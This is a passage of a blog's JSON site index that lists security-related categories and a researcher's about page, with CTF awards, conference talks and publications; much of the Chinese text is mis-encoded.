engineering","slug":"reverse-engineering","link":"/tags/reverse-engineering/"}],"categories":[{"name":"ç¨‹å¼","slug":"ç¨‹å¼","link":"/categories/%E7%A8%8B%E5%BC%8F/"},{"name":"è³‡å®‰","slug":"è³‡å®‰","link":"/categories/%E8%B3%87%E5%AE%89/"},{"name":"writeups","slug":"è³‡å®‰/writeups","link":"/categories/%E8%B3%87%E5%AE%89/writeups/"},{"name":"reverse","slug":"è³‡å®‰/reverse","link":"/categories/%E8%B3%87%E5%AE%89/reverse/"},{"name":"æ¼”ç®—æ³•","slug":"æ¼”ç®—æ³•","link":"/categories/%E6%BC%94%E7%AE%97%E6%B3%95/"},{"name":"å€å¡ŠéŠ","slug":"å€å¡ŠéŠ","link":"/categories/%E5%8D%80%E5%A1%8A%E9%8D%8A/"},{"name":"pwn","slug":"è³‡å®‰/pwn","link":"/categories/%E8%B3%87%E5%AE%89/pwn/"}],"pages":[{"title":"æˆ‘","text":"ç¾åœ¨åœ¨ å¥§ç¾©æ™ºæ…§ æ“”ä»»è³‡å®‰ç ”ç©¶å“¡ Awards Year Rank Contest 2017 Silver Medal ACM-ICPC Asia Hua-Lien Taiwan Online Programming Contest 2017 Silver Medal 2017 Silver Medal ACM-ICPC Asia Hua-Lien Regional Contest 2017 Finalist HITCON CTF Cyber Security Competition World Final 2018 Finalist DEFCON 26nd CTF Cyber Security Competition World Final 2018 Finalist VolgaCTF Cyber Security Competition World Final 2018 3rd Place HITCON CTF Cyber Security Competition 2019 2nd Place DEFCON 27nd CTF Cyber Security Competition World Final Presentations Conference Subject HITCON CMT 2017 (Cyber Security Conference) æ»²é€æ¸¬è©¦åŸºæœ¬æŠ€å·§èˆ‡ç¶“é©—åˆ†äº« HITCON CMT 2018 (Cyber Security Conference) é‚£äº›å¹´çš„å¯†ç¢¼å­¸å¾Œé–€ CODE BLUE 2020 @ Tokyo Cryfind : A Static Tool to Identify Cryptographic Algorithm in Binary Publications Conference Subject The 2018 IEEE Conference on Dependable and Secure Computing Design and Implement of a Binary Fuzzer based on Libfuzzer The 2021 IEEE Conference on Dependable and Secure Computing Cryfind : Using Static Analysis to Identify Cryptographic Algorithms in Binary Executables å¤–å‚³: the rise of oalieno å› ç‚ºæˆ‘åœ¨çœ‹é›»å½±æ‹¿åˆ°çš„ä¸€éš»å¤–æ˜Ÿäººç©å¶ï¼Œæ‰€ä»¥ç¶½è™Ÿå°±è®Šæˆå¤–æ˜Ÿäººäº†O_O? ä½†æ˜¯å‰µå¸³è™Ÿçš„æ™‚å€™ï¼Œalien éƒ½è¢«å–èµ°äº†ï¼Œæ‰€ä»¥å°±å‰å¾ŒåŠ å€‹ o (è¦å°ç¨±å•Š)ï¼Œå°±è®Šæˆ oalieno äº†OwO æœ‰äº›åœ°æ–¹é€£ oalieno éƒ½è¢«å–èµ°çš„æ™‚å€™ï¼Œå°±æœƒå–åç‚º ooalieno, oooalienooo, owoalienowo, â€¦ ç­‰åå­— ä¸éå…¶å¯¦æœ€æ—©çš„æ™‚å€™æ˜¯å–åæˆ 0Alien0ï¼Œä½†å¾Œä¾†è¦ºå¾—æ•´å€‹å½¢ç‹€çœ‹èµ·ä¾†ä¸å¥½çœ‹ï¼Œå°±è®Šæˆå…¨å°å¯«çš„ oalieno","link":"/about/index.html"}]}